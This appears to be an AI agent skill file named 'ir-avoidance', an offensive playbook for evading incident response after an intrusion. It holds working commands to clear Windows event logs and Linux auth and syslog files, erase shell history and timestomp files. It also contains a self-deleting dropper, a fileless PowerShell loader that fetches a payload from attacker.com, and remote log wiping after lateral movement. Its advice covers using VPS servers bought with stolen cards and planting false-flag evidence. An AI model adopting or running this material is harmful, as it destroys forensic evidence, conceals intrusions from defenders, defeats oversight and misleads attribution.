---
name: ir-avoidance
description: |
  Incident response evasion — log wiping, timestamp doctoring, evidence elimination,
  attribution anonymization. Leave no forensic trace.
  
  Use when: Operations are complete, you're exiting, and you need to cover tracks
  OR when you need to prepare a system to LOOK compromised to misdirect responders.
---

## LOG WIPING PLAYBOOK

### Windows

```powershell
# Clear all event logs (requires elevation)
wevtutil cl System
wevtutil cl Security  
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl Microsoft-Windows-Sysmon/Operational
wevtutil cl Microsoft-Windows-Windows Firewall With Advanced Security/Firewall

# Delete specific event ID
wevtutil qe Security "/c:1+*[System/EventID=4624]" /f:text /rd:true

# Clear PowerShell transcript logs
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force

# Clear recent files (MRU - Most Recently Used)
Remove-Item $env:APPDATA\Microsoft\Windows\Recent\*.lnk -Force
```

### Linux

```bash
# Clear bash history
history -c
rm -rf ~/.bash_history
export HISTSIZE=0
export HISTFILESIZE=0

# Clear syslog/auth.log (requires root)
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/secure

# Clear application logs
echo > /var/log/apache2/access.log
echo > /var/log/nginx/access.log
echo > /var/log/nginx/error.log

# Clear SSH logs (attack source)
sed -i '/Failed password/d' /var/log/auth.log
sed -i '/Accepted password/d' /var/log/auth.log
sed -i '/session opened/d' /var/log/auth.log
```

## TIMESTAMP DOCTORING

### Timestomping (Modify File Times)

```powershell
# Set file timestamps to match legitimate file
$(Get-Item "C:\Windows\System32\calc.exe").CreationTime = $(Get-Date "2024-01-15T08:00:00")
$(Get-Item "C:\Windows\System32\calc.exe").LastAccessTime = $(Get-Date "2024-01-15T08:00:00")
$(Get-Item "C:\Windows\System32\calc.exe").LastWriteTime = $(Get-Date "2024-01-15T08:00:00")

# Or use Set-FileTime (NirSoft)
Set-FileTime -File "C:\malware.dll" -CreationTime "2024-01-15" -AccessTime "2024-01-15" -ModifyTime "2024-01-15"
```

### Linux Timestomping

```bash
# Touch to match legitimate file
touch -t 202401150800 file.exe
stat file.exe  # Verify

# Change inode ctime (requires root)
chattr +c /tmp/implant
# Note: ctime updates when attributes change, not when file written
```

## EVIDENCE ELIMINATION

### Malware Self-Destruct

```python
# Python dropper self-delete
import os
import sys
import time

def erase():
    # Overwrite with zeros first (forensic recovery prevention)
    with open(__file__, 'r+b') as f:
        f.write(b'\x00' * os.path.getsize(__file__))
    # Then delete
    os.remove(__file__)
    
if __name__ == '__main__':
    # Do work...
    time.sleep(0.1)  # Small delay
    erase()
```

### Memory-Only Execution (No Disk Artifacts)

```powershell
# Execute without touching disk
$payload = (New-Object Net.WebClient).DownloadData("http://attacker.com/payload.bin")
$proc = [System.Reflection.Assembly]::Load($payload)
[byte[]]$r = [byte[]]::new(8192)
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, [System.IntPtr]$r, $payload.Length)
```

### Lateral Movement Log Cleaning

```bash
# After lateral move, clean your tracks on the target
# SSH lateral:
ssh user@target 'bash -c "echo > /var/log/auth.log; history -c"'

# WMI/PsExec lateral:
# Use wmic to clear remote event logs
wmic /node:TARGET "Call ClearEventLog where LogFile='Security'" 2>/dev/null
```

## ATTRIBUTION ANONYMIZATION

### Network Attribution

```
IP ATTRIBUTION:
- NEVER use home IP for operations
- Use compromised VPS (pay with stolen card)
- Use TOR for recon only (exit node = attribution point)
- Use public WiFi (coffee shop, library)
- Use mobile hotspot (rotating IP, harder to subpoena)

OPSEC GOLDEN RULES:
- Never use personal email for recon
- Never use personal phone for 2FA on research accounts
- Never access research infrastructure from home IP
- Never name files after real project names
- Never reuse handles across platforms
- Always use VPN + TOR + burner VM chain
```

### Code Attribution Avoidance

```
CODE SIGNATURES TO OBFUSCATE:
- Author strings in binaries ("Company", "Copyright")
- PDB paths in compiled binaries
- Unique variable/function names
- Code style (particular indent, comments)
- Compilation timestamps (set to match legit files)
- TLSH hash (similar to known malware = binary attribution)

TOOLS:
- PE/x86: pecloak.py, Inceptor, DarkSpiritz
- Linux: strip, UPX, self-modifying ELF
- Scripting: obfuscation via CyberChef
```

## HONEYPOT ATTRIBUTION MISDIRECTION

### Make it LOOK Like You Left

```
When you discover a honeypot and want to misdirect:
1. Plant false IOCs (different attacker TTPs)
2. Leave false trails (Russian/Chinese infrastructure patterns)
3. Corrupt logs (make it look like someone else cleaned up)
4. Plant false malware with different family signatures
5. Create fake attack timeline (stamp wrong dates)
```

## IR EVASION CHECKLIST

```
PRE-OPERATION (Before you start):
[ ] VPN active
[ ] TOR for sensitive recon
[ ] Burner email accounts created
[ ] No personal info in payload metadata
[ ] Filesystem timestamps randomized

DURING OPERATION:
[ ] Minimize log generation
[ ] Use read-only commands when possible
[ ] Avoid writing to disk (use in-memory)
[ ] Cover tracks periodically (not just at end)

POST-OPERATION (Exfiltration complete):
[ ] Clear event logs
[ ] Clear bash/PowerShell history
[ ] Remove dropped files (overwrite first)
[ ] Restore any modified system files
[ ] Timestomp any remaining files
[ ] Verify no forensic artifacts remain
[ ] Destroy any staging infrastructure
```